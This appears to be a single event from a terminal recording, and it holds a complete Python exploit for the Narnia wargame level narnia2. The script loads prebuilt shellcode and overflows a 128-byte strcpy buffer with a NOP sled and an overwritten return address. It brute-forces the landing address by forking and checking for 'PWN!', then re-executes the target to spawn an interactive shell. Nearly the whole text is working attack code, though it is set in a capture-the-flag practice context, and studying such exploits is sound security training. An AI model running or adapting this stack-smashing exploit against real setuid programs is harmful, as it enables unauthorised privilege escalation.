[0.013, "o", "import os, struct, time, select, sys\r\r\n\r\r\n# The shellcode is not hand-typed: it is loaded from the bytes nasm produced\r\r\n# in /tmp/l2.bin (objcopy -O binary --only-section=.text /tmp/l2.o).\r\r\nsc = open(\"/tmp/l2.bin\", \"rb\").read()\r\r\nprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()))\r\r\nassert 0 not in sc, \"argv cannot contain NUL bytes\"\r\r\nassert len(sc) <= 128, \"the shellcode must fit in buf[128]\"\r\r\n\r\r\n# main(): char buf[128]; strcpy(buf, argv[1]);\r\r\n# objdump: lea -0x80(%ebp),%eax ; push %eax ; call strcpy@plt\r\r\n# gdb:      buf = ebp-0x80 -> saved ebp at offset 128, ret at offset 132\r\r\n# argv[1] = [0..127] 128-byte buf (NOP sled then shellcode)\r\r\n#           [128..131] saved ebp (filler)\r\r\n#           [132..135] return address -> a word inside the NOP sled\r\r\ndef payload_for(addr):\r\r\n    p = b\"\\x90\" * (128 - len(sc)) + sc\r\r\n    assert len(p) == 128\r\r\n    return p + b\"B\" * 4 + struct.pack(\"<I\", addr)\r\r\n\r\r\nenv = {k.encode(): v.encode() for k, v in os.environ.items()}\r\r\n\r\r\ndef probe(addr):\r\r\n    r, w = os.pipe()\r\r\n    pid = os.fork()\r\r\n    if pid == 0:\r\r\n        os.close(r)\r\r\n        devnull = os.open(\"/dev/null\", os.O_RDONLY)\r\r\n        os.dup2(devnull, 0)\r\r\n        os.dup2(w, 1)\r\r\n        os.dup2(w, 2)\r\r\n        os.close(w)\r\r\n        os.execve(b\"/narnia/narnia2\", [b\"/narnia/narnia2\", payload_for(addr)], env)\r\r\n    os.close(w)\r\r\n    out = b\"\"\r\r\n    end = time.time() + 0.35\r\r\n    while time.time() < end:\r\r\n        ready, _, _ = select.select([r], [], [], 0.02)\r\r\n        if ready:\r\r\n            chunk = os.read(r, 4096)\r\r\n            if not chunk:\r\r\n                break\r\r\n            out += chunk\r\r\n    os.close(r)\r\r\n    os.waitpid(pid, 0)\r\r\n    return b\"PWN!\" in out\r\r\n\r\r\nprint(\"sweeping return addresses for the buf[128] strcpy overflow ...\")\r\r\nfound = None\r\r\nfor addr in range(0xffffd000, 0xffffe800, 4):\r\r\n    if probe(addr):\r\r\n        found = addr\r\r\n        break\r\r\nprint(\"landed in the NOP sled at\", hex(found) if found else \"NONE\")\r\r\nif found is None:\r\r\n    sys.exit(1)\r\r\n# Re-exec attached to the terminal so the spawned shell can be driven.\r\r\nos.execve(b\"/narnia/narnia2\", [b\"/narnia/narnia2\", payload_for(found)], env)\r\r\n\r\r\n"]
